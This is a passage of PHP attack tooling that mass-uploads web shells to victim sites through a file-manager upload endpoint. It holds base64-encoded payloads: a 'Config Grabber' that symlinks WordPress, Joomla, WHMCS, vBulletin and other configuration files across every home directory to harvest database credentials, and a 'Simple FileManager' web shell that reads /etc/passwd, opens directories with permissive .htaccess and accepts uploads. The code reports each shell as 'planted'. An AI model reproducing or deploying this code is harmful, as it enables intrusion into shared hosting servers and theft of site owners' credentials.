bGljX2h0bWwvdGVzdC93cC1jb25maWcucGhwJywkdXNlci4nLXdwLXRlc3QudHh0Jyk7DQpAc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2FyY2FkZS9mdW5jdGlvbnMvZGJjbGFzcy5waHAnLCR1c2VyLictaWJwcm9hcmNhZGUudHh0Jyk7DQpAc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2FyY2FkZS9mdW5jdGlvbnMvZGJjbGFzcy5waHAnLCR1c2VyLictaWJwcm9hcmNhZGUudHh0Jyk7DQpAc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2pvb21sYS9jb25maWd1cmF0aW9uLnBocCcsJHVzZXIuJy1qb29tbGEyLnR4dCcpOw0KQHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wcm90YWwvY29uZmlndXJhdGlvbi5waHAnLCR1c2VyLictam9vbWxhLXByb3RhbC50eHQnKTsNCkBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvam9vL2NvbmZpZ3VyYXRpb24ucGhwJywkdXNlci4nLWpvby50eHQnKTsNCkBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY21zL2NvbmZpZ3VyYXRpb24ucGhwJywkdXNlci4nLWpvb21sYS1jbXMudHh0Jyk7DQpAc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3NpdGUvY29uZmlndXJhdGlvbi5waHAnLCR1c2VyLictam9vbWxhLXNpdGUudHh0Jyk7DQpAc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL21haW4vY29uZmlndXJhdGlvbi5waHAnLCR1c2VyLictam9vbWxhLW1haW4udHh0Jyk7DQpAc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL25ld3MvY29uZmlndXJhdGlvbi5waHAnLCR1c2VyLictam9vbWxhLW5ld3MudHh0Jyk7DQpAc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL25ldy9jb25maWd1cmF0aW9uLnBocCcsJHVzZXIuJy1qb29tbGEtbmV3LnR4dCcpOw0KQHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob21lL2NvbmZpZ3VyYXRpb24ucGhwJywkdXNlci4nLWpvb21sYS1ob21lLnR4dCcpOw0KQHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC92Yi9pbmNsdWRlcy9jb25maWcucGhwJywkdXNlci4nLXZiLWNvbmZpZy50eHQnKTsNCkBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvdmIzL2luY2x1ZGVzL2NvbmZpZy5waHAnLCR1c2VyLictdmIzLWNvbmZpZy50eHQnKTsNCkBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2MvaW5jbHVkZXMvY29uZmlnLnBocCcsJHVzZXIuJy12YjEtY29uZmlnLnR4dCcpOw0KQHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlcy9jb25maWcucGhwJywkdXNlci4nLWluY2x1ZGVzLXZiLnR4dCcpOw0KQHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9pbmNsdWRlcy9jbGFzc19jb3JlLnBocCcsJHVzZXIuJy12Ymx1dHRpbi1jbGFzc19jb3JlLnBocC50eHQnKTsNCkBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvdmIvaW5jbHVkZXMvY2xhc3NfY29yZS5waHAnLCR1c2VyLictdmJsdXR0aW4tY2xhc3NfY29yZS5waHAxLnR4dCcpOw0KQHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jYy9pbmNsdWRlcy9jbGFzc19jb3JlLnBocCcsJHVzZXIuJy12Ymx1dHRpbi1jbGFzc19jb3JlLnBocDIudHh0Jyk7DQpAc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobS9jb25maWd1cmF0aW9uLnBocCcsJHVzZXIuJy13aG0xNS50eHQnKTsNCkBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2VudHJhbC9jb25maWd1cmF0aW9uLnBocCcsJHVzZXIuJy13aG0tY2VudHJhbC50eHQnKTsNCkBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htL3dobWNzL2NvbmZpZ3VyYXRpb24ucGhwJywkdXNlci4nLXdobS13aG1jcy50eHQnKTsNCkBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htL1dITUNTL2NvbmZpZ3VyYXRpb24ucGhwJywkdXNlci4nLXdobS1XSE1DUy50eHQnKTsNCkBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htYy9XSE0vY29uZmlndXJhdGlvbi5waHAnLCR1c2VyLictd2htYy1XSE0udHh0Jyk7DQpAc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobWNzL2NvbmZpZ3VyYXRpb24ucGhwJywkdXNlci4nLXdobWNzLnR4dCcpOw0KQHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwJywkdXNlci4nLXN1cHBvcnQudHh0Jyk7DQpAc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1cHAvY29uZmlndXJhdGlvbi5waHAnLCR1c2VyLictc3VwcC50eHQnKTsNCkBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc2VjdXJlL2NvbmZpZ3VyYXRpb24ucGhwJywkdXNlci4nLXN1Y3VyZS50eHQnKTsNCkBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc2VjdXJlL3dobS9jb25maWd1cmF0aW9uLnBocCcsJHVzZXIuJy1zdWN1cmUtd2htLnR4dCcpOw0KQHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zZWN1cmUvd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCR1c2VyLictc3VjdXJlLXdobWNzLnR4dCcpOw0KQHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jcGFuZWwvY29uZmlndXJhdGlvbi5waHAnLCR1c2VyLictY3BhbmVsLnR4dCcpOw0KQHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJHVzZXIuJy1wYW5lbC50eHQnKTsNCkBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9zdC9jb25maWd1cmF0aW9uLnBocCcsJHVzZXIuJy1ob3N0LnR4dCcpOw0KQHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob3N0aW5nL2NvbmZpZ3VyYXRpb24ucGhwJywkdXNlci4nLWhvc3RpbmcudHh0Jyk7DQpAc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3RzL2NvbmZpZ3VyYXRpb24ucGhwJywkdXNlci4nLWhvc3RzLnR4dCcpOw0KQHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWd1cmF0aW9uLnBocCcsJHVzZXIuJy1qb29tbGEudHh0Jyk7DQpAc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1Ym1pdHRpY2tldC5waHAnLCR1c2VyLictd2htY3MyLnR4dCcpOw0KQHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnRzL2NvbmZpZ3VyYXRpb24ucGhwJywkdXNlci4nLWNsaWVudHMudHh0Jyk7DQpAc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudC9jb25maWd1cmF0aW9uLnBocCcsJHVzZXIuJy1jbGllbnQudHh0Jyk7DQpAc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudGVzL2NvbmZpZ3VyYXRpb24ucGhwJywkdXNlci4nLWNsaWVudGVzLnR4dCcpOw0KQHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnRlL2NvbmZpZ3VyYXRpb24ucGhwJywkdXNlci4nLWNsaWVudC50eHQnKTsNCkBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50c3VwcG9ydC9jb25maWd1cmF0aW9uLnBocCcsJHVzZXIuJy1jbGllbnRzdXBwb3J0LnR4dCcpOw0KQHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iaWxsaW5nL2NvbmZpZ3VyYXRpb24ucGhwJywkdXNlci4nLWJpbGxpbmcudHh0Jyk7IA0KQHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9tYW5hZ2UvY29uZmlndXJhdGlvbi5waHAnLCR1c2VyLictd2htLW1hbmFnZS50eHQnKTsgDQpAc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL215L2NvbmZpZ3VyYXRpb24ucGhwJywkdXNlci4nLXdobS1teS50eHQnKTsgDQpAc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL215c2hvcC9jb25maWd1cmF0aW9uLnBocCcsJHVzZXIuJy13aG0tbXlzaG9wLnR4dCcpOyANCkBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkdXNlci4nLXplbmNhcnQudHh0Jyk7IA0KQHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC96ZW5jYXJ0L2luY2x1ZGVzL2Rpc3QtY29uZmlndXJlLnBocCcsJHVzZXIuJy1zaG9wLXplbmNhcnQudHh0Jyk7IA0KQHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaG9wL2luY2x1ZGVzL2Rpc3QtY29uZmlndXJlLnBocCcsJHVzZXIuJy1zaG9wLVpDc2hvcC50eHQnKTsgDQpAc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL1NldHRpbmdzLnBocCcsJHVzZXIuJy1zbWYudHh0Jyk7IA0KQHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zbWYvU2V0dGluZ3MucGhwJywkdXNlci4nLXNtZjIudHh0Jyk7IA0KQHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9TZXR0aW5ncy5waHAnLCR1c2VyLictc21mLWZvcnVtLnR4dCcpOyANCkBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW1zL1NldHRpbmdzLnBocCcsJHVzZXIuJy1zbWYtZm9ydW1zLnR4dCcpOyANCkBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvdXBsb2FkL2luY2x1ZGVzL2NvbmZpZy5waHAnLCR1c2VyLictdXAudHh0Jyk7DQpAc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2FydGljbGUvY29uZmlnLnBocCcsJHVzZXIuJy1Od2FoeS50eHQnKTsgDQpAc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3VwL2luY2x1ZGVzL2NvbmZpZy5waHAnLCR1c2VyLictdXAyLnR4dCcpOw0KQHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25mX2dsb2JhbC5waHAnLCR1c2VyLictNi50eHQnKTsNCkBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZS9kYi5waHAnLCR1c2VyLictNy50eHQnKTsNCkBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY29ubmVjdC5waHAnLCR1c2VyLictUEhQLUZ1c2lvbi50eHQnKTsNCkBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbWtfY29uZi5waHAnLCR1c2VyLictOS50eHQnKTsNCkBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZXMvY29uZmlnLnBocCcsJHVzZXIuJy10cmFpZG50MS50eHQnKTsNCkBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlnLnBocCcsJHVzZXIuJy00aW1hZ2VzLnR4dCcpOw0KQHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaXRlcy9kZWZhdWx0L3NldHRpbmdzLnBocCcsJHVzZXIuJy1EcnVwYWwudHh0Jyk7DQpAc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL21lbWJlci9jb25maWd1cmF0aW9uLnBocCcsJHVzZXIuJy0xbWVtYmVyLnR4dCcpIDsgDQpAc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2JpbGxpbmdzL2NvbmZpZ3VyYXRpb24ucGhwJywkdXNlci4nLWJpbGxpbmdzLnR4dCcpIDsgDQpAc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobS9jb25maWd1cmF0aW9uLnBocCcsJHVzZXIuJy13aG0udHh0Jyk7DQpAc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1cHBvcnRzL2NvbmZpZ3VyYXRpb24ucGhwJywkdXNlci4nLXN1cHBvcnRzLnR4dCcpOw0KQHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9yZXF1aXJlcy9jb25maWcucGhwJywkdXNlci4nLUFNNFNTLWhvc3RpbmcudHh0Jyk7DQpAc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1cHBvcnRzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkdXNlci4nLWhvc3RiaWxscy1zdXBwb3J0cy50eHQnKTsNCkBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50L2luY2x1ZGVzL2lzbzQyMTcucGhwJywkdXNlci4nLWhvc3RiaWxscy1jbGllbnQudHh0Jyk7DQpAc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1cHBvcnQvaW5jbHVkZXMvaXNvNDIxNy5waHAnLCR1c2VyLictaG9zdGJpbGxzLXN1cHBvcnQudHh0Jyk7DQpAc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2JpbGxpbmcvaW5jbHVkZXMvaXNvNDIxNy5waHAnLCR1c2VyLictaG9zdGJpbGxzLWJpbGxpbmcudHh0Jyk7DQpAc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2JpbGxpbmdzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkdXNlci4nLWhvc3RiaWxscy1iaWxsaW5ncy50eHQnKTsNCkBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9zdC9pbmNsdWRlcy9pc280MjE3LnBocCcsJHVzZXIuJy1ob3N0YmlsbHMtaG9zdC50eHQnKTsNCkBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9zdHMvaW5jbHVkZXMvaXNvNDIxNy5waHAnLCR1c2VyLictaG9zdGJpbGxzLWhvc3RzLnR4dCcpOw0KQHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob3N0aW5nL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkdXNlci4nLWhvc3RiaWxscy1ob3N0aW5nLnR4dCcpOw0KQHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob3N0aW5ncy9pbmNsdWRlcy9pc280MjE3LnBocCcsJHVzZXIuJy1ob3N0YmlsbHMtaG9zdGluZ3MudHh0Jyk7DQpAc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkdXNlci4nLWhvc3RiaWxscy50eHQnKTsNCkBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9zdGJpbGxzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkdXNlci4nLWhvc3RiaWxscy1ob3N0YmlsbHMudHh0Jyk7DQpAc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3RiaWxsL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkdXNlci4nLWhvc3RiaWxscy1ob3N0YmlsbC50eHQnKTsNCn0NCmVjaG8gIkRvbkUgd2l0aCBTdWNjZXNzIC0tPiA8YSBocmVmPSd4MDB4X2NvbmZpZ3MnPkNsaWNrIEhlcmU8L2E+PGJyPiI7DQp9DQo/Pg0KPGNlbnRlcj4NCjxwIGFsaWduPSJjZW50ZXIiPiZuYnNwOzwvcD4NCjxwIGFsaWduPSJjZW50ZXIiPjxmb250IGNvbG9yPSIjMkMyQzJDIiBzaXplPSI0Ij5CeSBEYW1hbmVEejwvZm9udD48YnI+PGJyPg0KTWFEZSBpbiBBbEdlcmlhIDIwMTMgJmNvcHk8L3A+DQo8cD48L2NlbnRlcj4NCjwvYm9keT4NCjwvaHRtbD4NCg==";
		$decode_isi = base64_decode($isi_nama_doang);
		$encode = base64_encode($global);
		$ss = fopen($global,"w");
		fputs($ss, $decode_isi);
		echo "[+] <a href='$korban' target='_blank'>$korban</a> <br>";
		echo "Done x00x Config's Grabber By DamaneDz (x00x.php) berhasil di tanam coba cek<br>";
		$url_mkfile = "$korban?cmd=mkfile&name=$global&target=l1_Lw";
 		$post1 = array(
				"target" => "l1_$encode",
				"content" => "$decode_isi",);
 		$post2 = array( "upload[]" => "@$global",);
 		$output_mkfile = ngirim("$korban", $post1);
			$upload_ah = ngirim("$korban?cmd=upload", $post2);
			}
		}
?>		
<form method="post">
<input type="submit" name="g" value="PLANT Simple FileManager By ShadowHearts">
</form>
<?php
$target = explode("\r\n", $_POST['target']);
if($_POST['g']) {
	foreach($target as $korban) {
		$global = "sfm.php";
		$isi_nama_doang = "PD9waHANCi8qIENyZWF0ZSBCeSBTaGFkZG93SGVydHMNCkdyZWF0cyBUbyBBbGwgTWVtYmVyIEdhcnVkYSBTZWN1cml0eSBIYWNrZXINCiovDQokbGFuZyA9ICdhdXRvJzsNCiRzaXRlX2NoYXJzZXQgPSAnYXV0byc7DQokaG9tZWRpciA9ICcuLyc7DQokZWRpdGNvbHMgPSA4MDsNCiRlZGl0cm93cyA9IDI1Ow0KJGh0YWNjZXNzID0gJy5odGFjY2Vzcyc7DQokaHRwYXNzd2QgPSAnLmh0cGFzc3dkJzsNCmlmIChnZXRfbWFnaWNfcXVvdGVzX2dwYygpKSB7DQoJYXJyYXlfd2FsaygkX0dFVCwgJ3N0cmlwJyk7DQoJYXJyYXlfd2FsaygkX1BPU1QsICdzdHJpcCcpOw0KCWFycmF5X3dhbGsoJF9SRVFVRVNULCAnc3RyaXAnKTsNCn0NCmlmIChhcnJheV9rZXlfZXhpc3RzKCdpbWFnZScsICRfR0VUKSkgew0KCWhlYWRlcignQ29udGVudC1UeXBlOiBpbWFnZS9naWYnKTsNCglkaWUoZ2V0aW1hZ2UoJF9HRVRbJ2ltYWdlJ10pKTsNCn0NCmlmICghZnVuY3Rpb25fZXhpc3RzKCdsc3RhdCcpKSB7DQoJZnVuY3Rpb24gbHN0YXQgKCRmaWxlbmFtZSkgew0KCQlyZXR1cm4gc3RhdCgkZmlsZW5hbWUpOw0KCX0NCgkkaXAgPSBnZXRob3N0YnluYW1lKCRfU0VSVkVSWydIVFRQX0hPU1QnXSk7DQp9DQplY2hvICJTZXJ2ZXIgSVA6PGZvbnQgY29sb3I9bGltZT4xMDQuMTU2LjU2LjIyOCIuQCRpcC4iPC9mb250PiB8IFlvdXIgSVA6IDxmb250IGNvbG9yPWxpbWU+Ii4kX1NFUlZFUlsnUkVNT1RFX0FERFInXS4iPC9mb250Pjxicj4iOw0KJGRlbGltID0gRElSRUNUT1JZX1NFUEFSQVRPUjsNCiRrZXJuZWwgPSBwaHBfdW5hbWUoKTsNCmVjaG8gJGtlcm5lbDsNCmlmIChmdW5jdGlvbl9leGlzdHMoJ3BocF91bmFtZScpKSB7DQoJJHdpbiA9IChzdHJ0b3VwcGVyKHN1YnN0cihQSFBfT1MsIDAsIDMpKSA9PT0gJ1dJTicpID8gdHJ1ZSA6IGZhbHNlOw0KfSBlbHNlIHsNCgkkd2luID0gKCRkZWxpbSA9PSAnXFwnKSA/IHRydWUgOiBmYWxzZTsNCn0NCg0KaWYgKCFlbXB0eSgkX1NFUlZFUlsnUEFUSF9UUkFOU0xBVEVEJ10pKSB7DQoJJHNjcmlwdGRpciA9IGRpcm5hbWUoJF9TRVJWRVJbJ1BBVEhfVFJBTlNMQVRFRCddKTsNCn0gZWxzZWlmICghZW1wdHkoJF9TRVJWRVJbJ1NDUklQVF9GSUxFTkFNRSddKSkgew0KCSRzY3JpcHRkaXIgPSBkaXJuYW1lKCRfU0VSVkVSWydTQ1JJUFRfRklMRU5BTUUnXSk7DQp9IGVsc2VpZiAoZnVuY3Rpb25fZXhpc3RzKCdnZXRjd2QnKSkgew0KCSRzY3JpcHRkaXIgPSBnZXRjd2QoKTsNCn0gZWxzZSB7DQoJJHNjcmlwdGRpciA9ICcuJzsNCn0NCiRob21lZGlyID0gcmVsYXRpdmUyYWJzb2x1dGUoJGhvbWVkaXIsICRzY3JpcHRkaXIpOw0KDQokZGlyID0gKGFycmF5X2tleV9leGlzdHMoJ2RpcicsICRfUkVRVUVTVCkpID8gJF9SRVFVRVNUWydkaXInXSA6ICRob21lZGlyOw0KDQppZiAoYXJyYXlfa2V5X2V4aXN0cygnb2xkZGlyJywgJF9QT1NUKSAmJiAhcGF0aF9pc19yZWxhdGl2ZSgkX1BPU1RbJ29sZGRpciddKSkgew0KCSRkaXIgPSByZWxhdGl2ZTJhYnNvbHV0ZSgkZGlyLCAkX1BPU1RbJ29sZGRpciddKTsNCn0NCg0KJGRpcmVjdG9yeSA9IHNpbXBsaWZ5X3BhdGgoYWRkc2xhc2goJGRpcikpOw0KZWNobyAnPGNlbnRlcj48ZGl2IGlkPSJtZW51Ij4nOw0KZWNobyAiPGhyIGNvbG9yPSdyZWQnPiI7DQplY2hvICI8YSBocmVmPSc/Jz5Ib21lPC9hPiI7DQplY2hvICI8YSBocmVmPSc/ZGlyPSRkaXImZG89Y29uZmlnJz5Db25maWc8L2E+IjsNCmVjaG8gIjxhIGhyZWY9Jz9kaXI9JGRpciZkbz1qdW1waW5nJz5KdW1waW5nPC9hPiI7DQplY2hvICI8YSBocmVmPSc/ZGlyPSRkaXImZG89YWRtaW5lcic+QWRtaW5lcjwvYT4iOw0KZWNobyAiPGEgaHJlZj0nP2Rpcj0kZGlyJmRvPXN5bWxpbmsnPnN5bWxpbms8L2E+IjsNCmVjaG8gIjxhIHN0eWxlPSdjb2xvcjogcmVkOycgaHJlZj0nP2xvZ291dD10cnVlJz5Mb2dvdXQ8L2E+IjsNCmVjaG8gIjxocj4iOw0KZWNobyAiPC9kaXY+IjsNCmlmKEAkX0dFVFsnbG9nb3V0J10gPT0gdHJ1ZSkgew0KCXVuc2V0KCRfU0VTU0lPTlttZDUoJF9TRVJWRVJbJ0hUVFBfSE9TVCddKV0pOw0KCWVjaG8gIjxzY3JpcHQ+d2luZG93LmxvY2F0aW9uPSc/Jzs8L3NjcmlwdD4iOw0KfSBlbHNlaWYoQCRfR0VUWydkbyddID09ICd1cGxvYWQnKSB7DQoJZWNobyAiPGNlbnRlcj4iOw0KCWlmKCRfUE9TVFsndXBsb2FkJ10pIHsNCgkJaWYoJF9QT1NUWyd0aXBlX3VwbG9hZCddID09ICdiaWFzYScpIHsNCgkJCWlmKEBjb3B5KCRfRklMRVNbJ2l4X2ZpbGUnXVsndG1wX25hbWUnXSwgIiRkaXIvIi4kX0ZJTEVTWydpeF9maWxlJ11bJ25hbWUnXS4iIikpIHsNCgkJCQkkYWN0ID0gIjxmb250IGNvbG9yPWxpbWU+VXBsb2FkZWQhPC9mb250PiBhdCA8aT48Yj4kZGlyLyIuJF9GSUxFU1snaXhfZmlsZSddWyduYW1lJ10uIjwvYj48L2k+IjsNCgkJCX0gZWxzZSB7DQoJCQkJJGFjdCA9ICI8Zm9udCBjb2xvcj1yZWQ+ZmFpbGVkIHRvIHVwbG9hZCBmaWxlPC9mb250PiI7DQoJCQl9DQoJCX0gZWxzZSB7DQoJCQkkcm9vdCA9ICRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10uIi8iLiRfRklMRVNbJ2l4X2ZpbGUnXVsnbmFtZSddOw0KCQkJJHdlYiA9ICRfU0VSVkVSWydIVFRQX0hPU1QnXS4iLyIuJF9GSUxFU1snaXhfZmlsZSddWyduYW1lJ107DQoJCQlpZihpc193cml0YWJsZSgkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddKSkgew0KCQkJCWlmKEBjb3B5KCRfRklMRVNbJ2l4X2ZpbGUnXVsndG1wX25hbWUnXSwgJHJvb3QpKSB7DQoJCQkJCSRhY3QgPSAiPGZvbnQgY29sb3I9bGltZT5VcGxvYWRlZCE8L2ZvbnQ+IGF0IDxpPjxiPiRyb290IC0+IDwvYj48L2k+PGEgaHJlZj0naHR0cDovLyR3ZWInIHRhcmdldD0nX2JsYW5rJz4kd2ViPC9hPiI7DQoJCQkJfSBlbHNlIHsNCgkJCQkJJGFjdCA9ICI8Zm9udCBjb2xvcj1yZWQ+ZmFpbGVkIHRvIHVwbG9hZCBmaWxlPC9mb250PiI7DQoJCQkJfQ0KCQkJfSBlbHNlIHsNCgkJCQkkYWN0ID0gIjxmb250IGNvbG9yPXJlZD5mYWlsZWQgdG8gdXBsb2FkIGZpbGU8L2ZvbnQ+IjsNCgkJCX0NCgkJfQ0KCX0NCgllY2hvICJVcGxvYWQgRmlsZToNCgk8Zm9ybSBtZXRob2Q9J3Bvc3QnIGVuY3R5cGU9J211bHRpcGFydC9mb3JtLWRhdGEnPg0KCTxpbnB1dCB0eXBlPSdyYWRpbycgbmFtZT0ndGlwZV91cGxvYWQnIHZhbHVlPSdiaWFzYScgY2hlY2tlZD5CaWFzYSBbICIudygkZGlyLCJXcml0ZWFibGUiKS4iIF0gDQoJPGlucHV0IHR5cGU9J3JhZGlvJyBuYW1lPSd0aXBlX3VwbG9hZCcgdmFsdWU9J2hvbWVfcm9vdCc+aG9tZV9yb290IFsgIi53KCRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10sIldyaXRlYWJsZSIpLiIgXTxicj4NCgk8aW5wdXQgdHlwZT0nZmlsZScgbmFtZT0naXhfZmlsZSc+DQoJPGlucHV0IHR5cGU9J3N1Ym1pdCcgdmFsdWU9J3VwbG9hZCcgbmFtZT0ndXBsb2FkJz4NCgk8L2Zvcm0+IjsNCgllY2hvICRhY3Q7DQoJZWNobyAiPC9jZW50ZXI+IjsNCgl9IGVsc2VpZihAJF9HRVRbJ2RvJ10gPT0gJ2NvbmZpZycpIHsNCgkkZXRjID0gZm9wZW4oIi9ldGMvcGFzc3dkIiwgInIiKSBvciBkaWUoIjxwcmU+PGZvbnQgY29sb3I9cmVkPkNhbid0IHJlYWQgL2V0Yy9wYXNzd2Q8L2ZvbnQ+PC9wcmU+Iik7DQoJJGlkeCA9IG1rZGlyKCJpZHhfY29uZmlnIiwgMDc3Nyk7DQoJJGlzaV9odGMgPSAiT3B0aW9ucyBhbGxcblJlcXVpcmUgTm9uZVxuU2F0aXNmeSBBbnkiOw0KCSRodGMgPSBmb3BlbigiaWR4X2NvbmZpZy8uaHRhY2Nlc3MiLCJ3Iik7DQoJZndyaXRlKCRodGMsICRpc2lfaHRjKTsNCgl3aGlsZSgkcGFzc3dkID0gZmdldHMoJGV0YykpIHsNCgkJaWYoJHBhc3N3ZCA9PSAiIiB8fCAhJGV0Yykgew0KCQkJZWNobyAiPGZvbnQgY29sb3I9cmVkPkNhbid0IHJlYWQgL2V0Yy9wYXNzd2Q8L2ZvbnQ+IjsNCgkJfSBlbHNlIHsNCgkJCXByZWdfbWF0Y2hfYWxsKCcvKC4qPyk6eDovJywgJHBhc3N3ZCwgJHVzZXJfY29uZmlnKTsNCgkJCWZvcmVhY2goJHVzZXJfY29uZmlnWzFdIGFzICR1c2VyX2lkeCkgew0KCQkJCSR1c2VyX2NvbmZpZ19kaXIgPSAiL2hvbWUvJHVzZXJfaWR4L3B1YmxpY19odG1sLyI7DQoJCQkJaWYoaXNfcmVhZGFibGUoJHVzZXJfY29uZmlnX2RpcikpIHsNCgkJCQkJJGdyYW